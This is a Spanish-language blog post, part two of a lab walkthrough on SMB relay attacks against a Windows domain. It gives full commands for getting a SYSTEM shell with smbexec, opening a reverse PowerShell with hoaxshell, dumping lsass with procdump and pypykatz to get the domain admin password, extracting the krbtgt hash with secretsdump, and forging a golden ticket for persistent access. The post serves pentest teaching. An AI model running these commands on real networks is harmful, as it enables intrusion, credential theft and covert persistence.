---
layout: single
title: Smb Relay - Parte 2
excerpt: "En esta segunda parte veremos como accder al PC02 utilizando proxychains y aprovechando el reenvío de credenciales, además de poder ver en texto claro las credenciales guardadas en el administrador de credenciales para conectarnos al controlador de dominio. Para finalizar conseguiremos persistencia en el DC1 generando un golden ticket para poder acceder sin necesidad de utilizar contraseña."
date: 2022-10-16
classes: wide
header:
  teaser: /assets/images/Smb-Relay/responder2.png
  teaser_home_page: true
categories:
  - Ciberseguridad
tags:
  - Windows
  - Privilege Escalation
  - Pentesting
---


## Acceso inicial

Ahora vamos a ganar acceso a la máquina PC02, de la siguiente forma. Ejecutamos proxychains smbexec.py -no-pass 'SIETEREINOS'/'JON'@'192.168.0.169' -debug -service-name test y directamente estamos dentro de la máquina PC02 con privilegios de system, los más elevados.

![](/assets/images/Smb-Relay/smbexec.png)

Pero esta consola es semi-interactiva, así que vamos a pasarnos a una consola totalmente interactiva de powershell con [hoaxshell](https://github.com/t3l3machus/hoaxshell) 

```bash
python3 hoaxshell.py -s 192.168.0.116 -H "Authorization"
```
Copiamos el comando que nos indica hoaxshell y lo ejecutamos en nuestra consola smbexec para obtener acceso con powershell.

![](/assets/images/Smb-Relay/hoaxshell.png)

![](/assets/images/Smb-Relay/cmd.png)

![](/assets/images/Smb-Relay/powershell.png)

## Acceso al controlador del dominio

El usuario de la máquina PC02 es un poco confiado y, además de guardar contraseñas en el navegador tiene la contraseña del administrador del dominio almacenada. Vamos a ver como podríamos verla.

![](/assets/images/Smb-Relay/creds.png)

Descargamos la herramienta [procdump](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump) de la suite de sysinternals, del propio microsoft. Lo descomprimimos y vamos a tranferir a la máquina PC02 el archivo procdump64.exe, levantamos un servidor smb en nuestra máquina de atacante (smbserver.py -smb2support ximo .) y copiamos el archivo desde el PC02 (copy \\\192.168.0.116\ximo\procdump64.exe procdump64.exe).

```bash
.\procdump64.exe -accepteula -ma lsass.exe lsass.dmp
```

![](/assets/images/Smb-Relay/procdump.png)

Nos tranferimos el archivo a nuestra máquina (copy lsass.dmp \\\192.168.0.116\ximo\lsass.dmp) y vamos a ver si con pypykatz podemos extraer esa contraseña.

```bash
pypykatz lsa minidump lsass.dmp
```
![](/assets/images/Smb-Relay/pypykatz.png)

Pypykatz nos muestra la contraseña en texto claro y tenemos la contraseña del administrador del dominio (!P@ssw0rd).

En este punto ya podemos conectarnos al servidor con evil-winrm.

![](/assets/images/Smb-Relay/evil.png)

## Persistencia con Golden Ticket

Vamos a generar un ticket de kerberos, firmado con el hash de la cuenta del usuario krbtgt, que es el encargado de firmar los tickets de kerberos, con lo cual el servidor pensará, cuando utilicemos el ticket, que ya hemos pasado la fase de validación de la contraseña y nos dará acceso aunque no usemos ninguna contraseña. Podremos acceder al servidor siempre que queramos aunque nos cambien la contraseña del administrador.

Lo primero que necesitaremos es el hash de la contraseña del usuario krbtgt. Lo podemos averiguar con secretsdump.

```bash
secretsdump.py Administrador:'!P@ssw0rd'@192.168.0.100 | grep krbtgt | grep :::
```

Lo siguiente que necesitamos es el SID del dominio. Esto lo sacamos con lokkupsid.

```bash
lookupsid.py sietereinos.local/Administrador:'!P@ssw0rd'@192.168.0.100
```
![](/assets/images/Smb-Relay/sid.png)

Ahora con la herramienta ticketer crearemos el ticket.

```bash
ticketer.py -nthash 96fe190f31307691486d57de87e59f56 -domain-sid S-1-5-21-4181028088-1212197574-1834492528 -domain sietereinos.local Administrador
```

Solo nos falta exportar una variable de entorno para poder conectarnos al servidor.

```bash
export KRB5CCNAME=/workspace/Administrador.ccache
```

Ya nos podemos conectar siempre que queramos sin utilizar contraseña con wmiexec, con el parámetro -k para utilizar kerberos con el ticket exportado en la variable de entorno y con -no-pass para indicarle que no utilice contraseña.

```bash
wmiexec.py -k -no-pass sietereinos.local/Administrador@dc1.sietereinos.local
```
![](/assets/images/Smb-Relay/ticket.png)

